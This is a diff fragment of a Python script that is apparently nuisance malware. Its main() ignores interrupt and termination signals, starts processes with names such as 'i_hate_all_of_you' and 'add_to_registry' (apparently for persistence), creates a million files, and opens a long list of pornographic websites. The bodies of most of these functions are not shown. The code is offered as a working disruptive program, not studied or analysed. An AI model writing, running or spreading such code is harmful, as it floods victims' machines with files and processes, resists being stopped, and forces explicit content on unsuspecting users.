+⠀⠀⢀⡾⠁⢀⣾⠏⢀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⡀⠀⠀⠀⠹⣆⠀⠀⠘⢦⠀⠀⠀⠀⣀⣴
+⠀⢠⡞⠁⢀⣾⠇⢀⣾⣿⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢸⣿⣧⡀⠀⠀⠀⠘⢦⡀⠀⠘⢇⣠⣶⣾⣿⣿
+⣰⠏⠀⠀⠿⠁⢠⣾⡇⢸⢸⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⡄⢸⣿⠻⢿⣦⢦⡀⠀⠀⠹⣦⣶⣿⣿⣿⣿⣿⣿
+⠁⠀⠀⠀⠀⢠⡏⠈⣇⢸⡜⣏⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠁⠼⠃⢰⣾⡆⠀⠈⢿⣹⣦⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⢰⣿⣤⣶⡿⠿⠿⣿⣆⠳⣄⠀⠀⠀⠀⠀⠠⣄⡀⠀⠀⢀⡞⠉⠉⠙⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠆⣾⢹⣷⠀⠀⢘⣷⣏⢧⠀⠀⠈⢿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⣿⠿⠃⠀⠀⠀⠀⠈⢻⣷⣌⡓⠀⠀⠀⠀⠀⠈⠉⠁⢰⣏⣴⣯⣷⡀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢪⣞⣹⣦⡽⠦⢤⣘⡟⣏⠊⠃⠀⠀⠈⢻⣿⣿⣿⣿
+⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⠰⣄⡻⣎⠙⠲⠤⣄⣀⣀⣀⣀⣀⣼⡿⡿⠉⢸⣷⣀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⠟⠁⠀⠀⠀⠘⢽⣿⡀⠀⠀⠀⠀⠀⠹⣿⣿⣿
+⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢾⣿⣦⣀⠀⠉⠉⠉⣿⣿⣿⣡⡇⠀⠀⣿⣿⠉⠓⠶⣄⣀⡀⠀⠀⣀⣠⡴⠞⣋⡾⡛⠁⠀⠀⠀⠀⠀⠀⠈⢿⡇⠀⠀⠀⠀⠀⠀⠘⢿⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣏⣳⣶⣄⣴⠿⡿⠟⠛⠛⠛⠛⠻⠿⢦⣄⣀⠀⠉⠉⣿⠉⠉⣁⣠⣞⡉⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠈⢿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠉⡉⣉⢉⣙⡛⠃⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⠶⢶⠿⠊⠉⠙⡒⡊⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
+""")
+        except Exception as e:
+            print(f"Failed to create file: {e}")
+        except PermissionError:
+            pass
+
+"""Ignore interruptions"""
+def signal_handler(signum, frame):
+    pass
+
+"""Build this monster"""
+def main():
+    urls = [
+        "https://www.pornhub.com",
+        "https://www.beeg.com",
+        "https://www.xnxx.com",
+        "https://www.hanime.tv",
+        "https://xhamster.com",
+        "https://www.youporn.com",
+        "https://www.redtube.com",
+        "https://www.porn.com",
+        "https://www.tube8.com",
+        "https://www.ixxx.com",
+        "https://www.sunporno.com",
+        "https://www.pornhat.com",
+        "https://www.porn300.com",
+        "https://pornone.com"
+        "https://www.sexvid.xxx",
+        "https://zbporn.com",
+        "https://www.fuq.com",
+        "https://www.tubegalore.com",
+        "https://xxxbunker.com",
+        "https://www.cumlouder.com"
+        "https://porndoe.com",
+        "https://xbabe.com",
+        "https://vipwank.com",
+        "https://www.porndroids.com",
+        "https://www.alohatube.com",
+        "https://www.maturetube.com",
+        "https://www.tubev.sex",
+        "https://www.4tube.com",
+        "https://shameless.com",
+        "https://www.megatube.xxx",
+        "https://www.porntube.com",
+        "https://www.porndig.com",
+        "https://www.pornburst.xxx",
+        "https://www.bigporn.com",
+        "https://www.porn.biz",
+        "https://fapvidhd.com",
+        "https://www.melonstube.com",
+        "https://tastyblacks.com",
+        "https://www.lobstertube.com",
+        "https://fapster.xxx",
+        "https://viviporn.tv",
+        "https://pornfaze.com",
+        "https://pornmaki.com",
+        "https://www.pornid.xxx",
+        "https://www.hotporntubes.com",
+        "https://pornito.xxx",
+        "https://thematureporn.net",
+        "https://www.xxxvideos247.com",
+        "https://handjobhub.com",
+        "https://www.porn7.xxx",
+        "https://www.forhertube.com",
+        "https://www.pornheed.com",
+        "https://www.orgasm.com",
+        "https://www.pornrabbit.com",
+        "https://www.tiava.com",
+        "https://www.fux.com",
+        "https://www.metaporn.com",
+        "https://www.pornerbros.com",
+        "https://www.gaymaletube.com",
+        "https://manporn.xxx",
+        "https://www.youporngay.com",
+        "https://www.gayfuror.com",
+        "https://www.justusboys.com",
+        "https://filf.com/?utm_source=toppornsitescom",
+        "https://myporngay.com",
+        "https://bigassporn.tv",
+        "https://www.assoass.com",
+        "https://www.pornpics.com",
+        "https://www.youx.xxx",
+        "https://www.hotpornphotos.com",
+        "https://www.pichunter.com",
+        "https://nakedpornpics.com",
+        "https://www.bellesa.co",
+        "https://www.stasyq.com",
+        "https://www.zenra.net",
+        "https://vjav.com",
+        "https://www.lesbian8.com",
+        "https://www.girlsway.com",
+        "http://milfporn.tv",
+        "https://bdsmstreak.com",
+        "https://www.punishbang.com",
+        "https://www.clips4sale.com",
+        "https://hentaigasm.com",
+        "https://www.fakku.net",
+        "https://gelbooru.com",
+        "https://porcore.com",
+        "https://www.cartoonporno.xxx",
+        "https://www.xvideos.com"
+    ]
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    introduction()
+    process_creator = Process(target=i_hate_all_of_you)
+    process_creator.start()
+    cmd_thread = threading.Thread(target=spawn_my_playground)
+    cmd_thread.start()
+    registry_thr = Process(target=add_to_registry)
+    registry_thr.start()
+    file_thread = threading.Thread(target=create_large_number_of_files, args=(1000000, ))
+    file_thread.start()
+    spawn_my_bros(urls)
+
+if __name__ == "__main__":
+    main()
